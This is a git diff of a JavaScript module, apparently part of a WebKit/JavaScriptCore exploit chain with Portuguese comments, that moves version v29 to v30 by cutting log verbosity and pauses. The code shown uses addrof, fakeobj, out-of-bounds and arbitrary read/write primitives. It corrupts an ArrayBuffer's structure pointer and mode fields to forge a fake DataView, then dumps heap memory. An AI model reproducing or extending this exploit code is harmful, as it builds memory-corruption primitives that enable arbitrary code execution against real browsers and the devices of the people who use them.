@@ -1,7 +1,7 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v29 - Foco na Depuração de arb_read e Offsets de DV)
+// js/script3/testArrayBufferVictimCrash.mjs (v30 - Otimização de Log e Foco na FASE 3)
 // =======================================================================================
-// ESTA VERSÃO ADICIONA MAIS DUMPS E LOGS DETALHADOS DENTRO DAS PRIMITIVAS ARB_READ/ARB_WRITE.
-// FOCO: Validar os offsets de DataView e a corrupção/restauração do m_vector.
+// ESTA VERSÃO REDUZ A VERBOSIDADE DO LOG E AS PAUSAS, FOCANDO NA DEPURACAO DA FASE 3.
+// FOCO: Otimizar o desempenho do teste e manter o foco na falha do DataView forjado.
 // =======================================================================================
 
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -12,7 +12,7 @@ import {
     addrof_core,
     fakeobj_core,
     initCoreAddrofFakeobjPrimitives,
-    arb_read, // Usar a primitiva arb_read (old) para o teste inicial
+    arb_read,
     arb_write,
     selfTestOOBReadWrite,
     oob_read_absolute,
@@ -22,14 +22,14 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v29 - Foco na Depuração de arb_read e Offsets de DV"; // Versão atualizada
+export const FNAME_MODULE = "v30 - Otimização de Log e Foco na FASE 3"; // Versão atualizada
 
-// Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
-const LOCAL_VERY_SHORT_PAUSE = 10;
-const LOCAL_SHORT_PAUSE = 100;
-const LOCAL_MEDIUM_PAUSE = 750;
-const LOCAL_LONG_PAUSE = 1500;
-const LOCAL_SHORT_SHORT_PAUSE = 50;
+// Ajustando pausas: mantendo algumas mas reduzindo as muito curtas e excessivas
+const LOCAL_VERY_SHORT_PAUSE = 5; // Reduzido
+const LOCAL_SHORT_PAUSE = 50;    // Reduzido
+const LOCAL_MEDIUM_PAUSE = 250;  // Reduzido
+const LOCAL_LONG_PAUSE = 500;    // Reduzido
+const LOCAL_SHORT_SHORT_PAUSE = 25; // Reduzido
 
 const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8; // Constante para JSValue (8 bytes)
 
@@ -41,8 +41,10 @@ let _backing_array_buffer_for_fake_dv = null; // ArrayBuffer real que será type
 
 // Funções Auxiliares Comuns (dumpMemory)
 async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") {
-    logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
+    // Reduzir logs de debug para dumps muito grandes, a menos que seja crítico
+    // logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
     const bytesPerRow = 16;
+    let dumpLines = [];
     for (let i = 0; i < size; i += bytesPerRow) {
         let hexLine = address.add(i).toString(true) + ": "; 
         let asciiLine = "  ";
@@ -51,16 +53,14 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
         for (let j = 0; j < bytesPerRow; j++) {
             if (i + j < size) {
                 try {
-                    // Para este dump, se arbReadFn for arb_read_universal_js_heap, ele irá usá-la.
-                    // Caso contrário, usará a arb_read (old primitive).
-                    const byte = await arbReadFn(address.add(i + j), 1, logFn); // Passar logFn para a primitiva
+                    const byte = await arbReadFn(address.add(i + j), 1, logFn);
                     rowBytes.push(byte);
                     hexLine += byte.toString(16).padStart(2, '0') + " ";
                     asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
                 } catch (e) {
                     hexLine += "?? ";
                     asciiLine += "?";
-                    logFn(`[${sourceName}] ERRO ao ler byte em ${address.add(i + j).toString(true)}: ${e.message}`, "error");
+                    // logFn(`[${sourceName}] ERRO ao ler byte em ${address.add(i + j).toString(true)}: ${e.message}`, "error"); // Remover log por byte, manter para toda a linha
                     for (let k = j + 1; k < bytesPerRow; k++) { hexLine += "?? "; asciiLine += "?"; }
                     break;
                 }
@@ -69,13 +69,11 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
                 asciiLine += " ";
             }
         }
-        logFn(`[${sourceName}] ${hexLine}${asciiLine}`, "leak");
+        dumpLines.push(`[${sourceName}] ${hexLine}${asciiLine}`);
     }
-    logFn(`[${sourceName}] Fim do dump.`, "debug");
+    dumpLines.forEach(line => logFn(line, "leak")); // Logar todas as linhas de uma vez como "leak"
+    // logFn(`[${sourceName}] Fim do dump.`, "debug");
 }
-
-// Note: arb_read_universal_js_heap e arb_write_universal_js_heap são importadas de core_exploit.mjs.
-// Não há alteração nelas neste arquivo, mas suas definições corrigidas estão no core_exploit.mjs.
 
 /**
  * Tenta configurar o esqueleto da primitiva de leitura/escrita arbitrária universal (sem o ASLR ainda).
@@ -103,9 +101,10 @@ async function setupUniversalArbitraryReadWriteSkeleton(logFn, pauseFn, JSC_OFFS
         await pauseFn(LOCAL_VERY_SHORT_PAUSE);
 
         // DUMP 1: Conteúdo do backing_array_buffer_for_fake_dv antes da corrupção inicial.
+        // ESSENCIAL PARA ENTENDER LAYOUT E ONDE ESCREVER
         logFn(`[${FNAME}] DEBUG: Dump do backing_array_buffer_for_fake_dv (0x${toHex(backing_ab_addr.low())}) ANTES da corrupção inicial (primeiros 0x60 bytes):`, "debug");
         await dumpMemory(backing_ab_addr, 0x60, logFn, arb_read, `${FNAME}_BackingAB_Before`); // Usar arb_read (old primitive)
-        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
+        await pauseFn(LOCAL_SHORT_PAUSE); // Pausa mais longa para visualização
 
         // Corromper os metadados do ArrayBuffer de apoio para fazê-lo se parecer com um DataView.
         logFn(`[${FNAME}] Escrevendo Structure Pointer com Zero (OFFSET: ${toHex(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET)})...`, "info", FNAME);
@@ -125,11 +124,12 @@ async function setupUniversalArbitraryReadWriteSkeleton(logFn, pauseFn, JSC_OFFS
         await pauseFn(LOCAL_VERY_SHORT_PAUSE);
 
         logFn(`[${FNAME}] Metadados de ArrayBuffer de apoio corrompidos para m_mode ${toHex(m_mode_to_try)} com Structure Pointer Zero.`, "info", FNAME);
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // DUMP 2: Conteúdo do backing_array_buffer_for_fake_dv APÓS a corrupção inicial.
         logFn(`[${FNAME}] DEBUG: Dump do backing_array_buffer_for_fake_dv (0x${toHex(backing_ab_addr.low())}) APÓS todas as corrupções iniciais:`, "debug");
         await dumpMemory(backing_ab_addr, 0x60, logFn, arb_read, `${FNAME}_BackingAB_AfterCorruption`); // Usar arb_read
-        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
+        await pauseFn(LOCAL_SHORT_PAUSE); // Pausa mais longa para visualização
 
         // Forjar o DataView a partir do endereço do ArrayBuffer corrompido.
         logFn(`[${FNAME}] Chamando fakeobj_core para forjar o DataView a partir de ${backing_ab_addr.toString(true)}...`, "info", FNAME);
@@ -141,13 +141,13 @@ async function setupUniversalArbitraryReadWriteSkeleton(logFn, pauseFn, JSC_OFFS
             return false;
         }
         logFn(`[${FNAME}] DataView forjado (esqueleto) criado com sucesso: ${_fake_data_view} (typeof: ${typeof _fake_data_view})`, "good", FNAME);
-        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // DUMP 3: Conteúdo do _fake_data_view (em seu próprio endereço)
         const fake_dv_addr = addrof_core(_fake_data_view);
         logFn(`[${FNAME}] DEBUG: Dump do _fake_data_view (0x${toHex(fake_dv_addr.low())}) APÓS criação do esqueleto (primeiros 0x60 bytes):`, "debug");
         await dumpMemory(fake_dv_addr, 0x60, logFn, arb_read, `${FNAME}_FakeDV_AfterSkeleton`); // Usar arb_read
-        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // Teste Básico: tentar ler o byteLength do fake_data_view.
         logFn(`[${FNAME}] Verificando byteLength do fake DataView...`, "info", FNAME);
